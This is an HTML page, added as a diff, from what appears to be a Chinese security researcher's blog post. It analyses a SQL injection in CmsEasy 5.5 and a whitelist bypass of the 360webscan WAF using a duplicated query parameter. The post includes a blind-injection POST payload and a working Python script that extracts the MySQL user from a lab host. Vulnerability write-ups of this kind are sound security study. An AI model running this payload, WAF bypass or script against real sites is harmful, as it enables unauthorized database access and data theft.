@@ -1,0 +1,649 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>cmseasy最新注入+360webscan的绕过分析 | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                网络安全 &raquo; <a href="cmseasy-sql-injection-bypass-360webscan.html">cmseasy最新注入+360webscan的绕过分析</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">cmseasy最新注入+360webscan的绕过分析</h1>
+            <div class="details-up">
+  <span class="author">作者: None</span>
+  
+  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
+  
+  <span class="date">时间: 2015-4-18 15:17</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">7条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="cmseasy-sql-injection-bypass-360webscan.html">9513人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/360webscan.html">360webscan</a>
+    
+        <a href="../tag/WAF%E7%BB%95%E8%BF%87.html">WAF绕过</a>
+    
+        <a href="../tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">注入漏洞</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <p>最近一直没什么好文章，只有闲下来挖了几个洞。一般挖洞的时候就没法发文章，因为自己提交上去的洞在公开前是不能泄露的。不过这个洞与乌云某大牛的洞重复了，于是我就发出来一起学习一下。不过这个洞应该有些年头了。</p>
+<p>先下载最新版：<a href="http://ftp.cmseasy.cn/CmsEasy5.x/CmsEasy_5.5_UTF-8_20150318.zip">http://ftp.cmseasy.cn/CmsEasy5.x/CmsEasy_5.5_UTF-8_20150318.zip</a>。经过神器比对，发现最新版进行了一些功能上的修改，可就是这处修改造成注入。</p>
+<p>/lib/default/archive_act.php 283行</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">front</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;catid&#39;</span><span class="p">))</span> <span class="p">{</span>
+
+           <span class="nv">$cateobj</span> <span class="o">=</span> <span class="nx">category</span><span class="o">::</span><span class="na">getInstance</span><span class="p">();</span>
+           <span class="nv">$sons</span> <span class="o">=</span> <span class="nv">$cateobj</span><span class="o">-&gt;</span><span class="na">sons</span><span class="p">(</span><span class="nx">front</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;catid&#39;</span><span class="p">));</span>
+           <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sons</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sons</span><span class="p">)){</span>
+               <span class="nv">$cids</span> <span class="o">=</span> <span class="nx">front</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;catid&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="nv">$sons</span><span class="p">);</span>
+           <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+               <span class="nv">$cids</span> <span class="o">=</span> <span class="nx">front</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;catid&#39;</span><span class="p">);</span>
+           <span class="p">}</span>
+           <span class="nv">$condition</span> <span class="o">.=</span> <span class="s2">&quot;catid in (&quot;</span><span class="o">.</span><span class="nv">$cids</span><span class="o">.</span><span class="s2">&quot;) AND &quot;</span><span class="p">;</span>
+           <span class="c1">//var_dump($condition);exit;</span>
+       <span class="p">}</span>
+</pre></div>
+
+
+<p><code>$condition .= "catid in (".$cids.") AND ";</code>直接将<code>$cids</code>放入SQL语句，而<code>$cids = front::post('catid');</code>。 由于没有引号包裹，所以造成注入。</p>
+<p>绕过360webscan的方法，还是借助白名单，但方式有点区别。</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd">*  拦截目录白名单</span>
+<span class="sd">*/</span>
+<span class="k">function</span> <span class="nf">webscan_white</span><span class="p">(</span><span class="nv">$webscan_white_name</span><span class="p">,</span><span class="nv">$webscan_white_url</span><span class="o">=</span><span class="k">array</span><span class="p">())</span> <span class="p">{</span>
+ <span class="nv">$url_path</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_NAME&#39;</span><span class="p">];</span>
+ <span class="nv">$url_var</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
+ <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$webscan_white_name</span><span class="o">.</span><span class="s2">&quot;/is&quot;</span><span class="p">,</span><span class="nv">$url_path</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$webscan_white_name</span><span class="p">))</span> <span class="p">{</span>
+   <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+ <span class="p">}</span>
+ <span class="k">foreach</span> <span class="p">(</span><span class="nv">$webscan_white_url</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$url_var</span><span class="p">)</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">)){</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$url_path</span><span class="p">,</span><span class="nv">$key</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$url_var</span><span class="p">,</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
+       <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+     <span class="p">}</span>
+   <span class="p">}</span>
+   <span class="k">elseif</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$url_var</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$url_path</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
+       <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+     <span class="p">}</span>
+   <span class="p">}</span>
+
+ <span class="p">}</span>
+
+ <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p><code>if (stristr($url_path,$key)&amp;&amp;stristr($url_var,$value))</code>，当key和value都在白名单中存在时，就不进行过滤。</p>
+<p>而白名单的数组为：</p>
+<p><code>$webscan_white_url = array('index.php' =&gt; 'admin_dir=admin','index.php' =&gt; 'case=file','index.php' =&gt;'case=admin');</code></p>
+<p>也就是说index.php?case=file，这样的请求就不会检测。</p>
+<p>但我们的目标url是index.php?case=archive&amp;act=search&amp;page=1，不是case=file。没关系呀，这里比对的时候用的是<code>$_SERVER['QUERY_STRING'];</code>，而PHP对于两个case=xxx，是取后面一个作为值。所以，请求/index.php?page=1&amp;case=admin&amp;case=archive&amp;act=search即可。</p>
+<p>这样，即可以在QUERY_STRING里找到case=admin，进而绕过360webscan，又可以让case=archive。</p>
+<p>测试：</p>
+<p>向http://10.211.55.3/cmseasy/index.php?page=1&amp;case=admin&amp;case=archive&amp;act=search&amp;keyword=-1 POST数据 catid=-1) or ord(substr(user(),1,1))=114%23</p>
+<p>=114（r）的时候有返回结果： </p>
+<p><a href="../content/uploadfile/201504/e2361429345203.png"><img alt="QQ20150404-2@2x.png" src="../content/uploadfile/201504/thum-e2361429345203.png" /></a> </p>
+<p>=115的时候没有返回结果：</p>
+<p><a href="../content/uploadfile/201504/b8161429345207.png"><img alt="QQ20150404-3@2x.png" src="../content/uploadfile/201504/thum-b8161429345207.png" /></a></p>
+<p>脚本验证：</p>
+<p><a href="../content/uploadfile/201504/b40a1429345198.png"><img alt="QQ20150404-1@2x.png" src="../content/uploadfile/201504/thum-b40a1429345198.png" /></a></p>
+<p>脚本如下：</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">traceback</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+       <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36&#39;</span>
+<span class="p">}</span>
+<span class="n">payloads</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="s1">&#39;@abcdefghijklmnopqrstuvwxyz.0123456789&#39;</span><span class="p">)</span>
+<span class="k">print</span> <span class="s1">&#39;start to retrive MySQL infomation:&#39;</span>
+<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
+       <span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+       <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span>
+               <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+                       <span class="k">try</span><span class="p">:</span>
+                               <span class="n">data</span> <span class="o">=</span>  <span class="p">{</span>
+                                       <span class="s2">&quot;catid&quot;</span><span class="p">:</span> <span class="s1">&#39;-1) or ord(substr(user(),</span><span class="si">%s</span><span class="s1">,1))=</span><span class="si">%s</span><span class="s1">#&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+                               <span class="p">}</span>
+                               <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;http://10.211.55.3/cmseasy/index.php?page=1&amp;case=admin&amp;case=archive&amp;act=search&amp;keyword=-1&quot;</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">5</span><span class="p">)</span>
+                               <span class="k">if</span> <span class="s2">&quot;&lt;strong&gt;1&lt;/strong&gt;&quot;</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+                                       <span class="n">user</span> <span class="o">+=</span> <span class="n">payload</span>
+                                       <span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[In progress]&#39;</span><span class="p">,</span> <span class="n">user</span>
+                                       <span class="k">break</span>
+                       <span class="k">except</span><span class="p">:</span>
+                               <span class="k">print</span> <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">()</span>
+                               <span class="k">break</span>
+                       <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
+                       <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+       <span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[Done]infomation is&#39;</span><span class="p">,</span> <span class="n">user</span>
+
+<span class="n">run</span><span class="p">()</span>
+</pre></div>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/360webscan.html">360webscan</a>
+                
+                    <a href="../tag/WAF%E7%BB%95%E8%BF%87.html">WAF绕过</a>
+                
+                    <a href="../tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">注入漏洞</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 7 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-2099">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">HELEN</a></div>
+                    <p>还没来得及玩就修复了。。</p>
+                    <span class="comment-time">时间: 2015-06-02 14:13</span>
+                    <span class="comment-reply"><a href="#comment-2099" onclick="reply_to('2099','HELEN')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2035">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/7dd5fa98c8c8fc6032731b1f5df06d44.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">nf0v</a></div>
+                    <p>神器是什么？文中提到的神器，求大牛回答！！</p>
+                    <span class="comment-time">时间: 2015-04-22 08:40</span>
+                    <span class="comment-reply"><a href="#comment-2035" onclick="reply_to('2035','nf0v')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2037">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.leavesongs.com/" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@nf0v：佛曰不能说</p>
+                    <span class="comment-time">时间: 2015-04-22 11:54</span>
+                    <span class="comment-reply"><a href="#comment-2037" onclick="reply_to('2037','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2039">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/7dd5fa98c8c8fc6032731b1f5df06d44.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">nf0v</a></div>
+                    <p>@phithon：beyond compare 对把，谢谢大牛！</p>
+                    <span class="comment-time">时间: 2015-04-22 12:31</span>
+                    <span class="comment-reply"><a href="#comment-2039" onclick="reply_to('2039','nf0v')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2034">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/7dd5fa98c8c8fc6032731b1f5df06d44.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">nf0v</a></div>
+                    <p>神奇是什么？</p>
+                    <span class="comment-time">时间: 2015-04-21 17:37</span>
+                    <span class="comment-reply"><a href="#comment-2034" onclick="reply_to('2034','nf0v')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2032">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/510f3eac7116915ec7495c370163f63d.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://abc000.cn/" target="_blank" rel="nofollow noopener">神州网络</a></div>
+                    <p>支持</p>
+                    <span class="comment-time">时间: 2015-04-20 16:38</span>
+                    <span class="comment-reply"><a href="#comment-2032" onclick="reply_to('2032','神州网络')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2030">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/bacb85dc885e2fb67422b43e8857112f.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://th1nk.info" target="_blank" rel="nofollow noopener">Th1nk</a></div>
+                    <p>自从时雨牛有了mac之后，更加炫酷了</p>
+                    <span class="comment-time">时间: 2015-04-18 19:53</span>
+                    <span class="comment-reply"><a href="#comment-2030" onclick="reply_to('2030','Th1nk')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="58018d3afe92a2ce2d4a65b1411c0dc31b0aac18" />
+</div><div class="col-6">
+<img src="../captcha/image/58018d3afe92a2ce2d4a65b1411c0dc31b0aac18/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="353" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="JDwu4VCX3ueaGmTKUg4ANZPexQtxwKKTvbUlC0dGrQsTeUH8Wh1lKsSjSdKI5mWb">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86.html">大文件处理</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8.html">回调后门</a>
+        
+        <a rel="tag" href="../tag/iOS.html">iOS</a>
+        
+        <a rel="tag" href="../tag/%E4%BD%8D%E8%BF%90%E7%AE%97.html">位运算</a>
+        
+        <a rel="tag" href="../tag/%E6%A1%A5%E6%8E%A5.html">桥接</a>
+        
+        <a rel="tag" href="../tag/writeup.html">writeup</a>
+        
+        <a rel="tag" href="../tag/IIS.html">IIS</a>
+        
+        <a rel="tag" href="../tag/WTForm.html">WTForm</a>
+        
+        <a rel="tag" href="../tag/apache.html">apache</a>
+        
+        <a rel="tag" href="../tag/web%E6%8C%87%E7%BA%B9.html">web指纹</a>
+        
+        <a rel="tag" href="../tag/%E6%B1%89%E8%AF%BA%E5%A1%94.html">汉诺塔</a>
+        
+        <a rel="tag" href="../tag/cmd%E5%90%8E%E9%97%A8.html">cmd后门</a>
+        
+        <a rel="tag" href="../tag/Linux.html">Linux</a>
+        
+        <a rel="tag" href="../tag/CSP.html">CSP</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%A2%E9%98%9F.html">团队</a>
+        
+        <a rel="tag" href="../tag/phpwind.html">phpwind</a>
+        
+        <a rel="tag" href="../tag/%E6%80%BB%E7%BB%93.html">总结</a>
+        
+        <a rel="tag" href="../tag/%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95.html">遍历目录</a>
+        
+        <a rel="tag" href="../tag/C-FREE.html">C-FREE</a>
+        
+        <a rel="tag" href="../tag/var_dump.html">var_dump</a>
+        
+        <a rel="tag" href="../tag/disable_functions.html">disable_functions</a>
+        
+        <a rel="tag" href="../tag/%E6%8A%A5%E7%BA%B8.html">报纸</a>
+        
+        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
+        
+        <a rel="tag" href="../tag/web%E5%BA%94%E7%94%A8.html">web应用</a>
+        
+        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
+        
+        <a rel="tag" href="../tag/asyncore.html">asyncore</a>
+        
+        <a rel="tag" href="../tag/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87.html">沙盒绕过</a>
+        
+        <a rel="tag" href="../tag/fckeditor.html">fckeditor</a>
+        
+        <a rel="tag" href="../tag/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E5%BA%A6.html">数据库速度</a>
+        
+        <a rel="tag" href="../tag/kali.html">kali</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
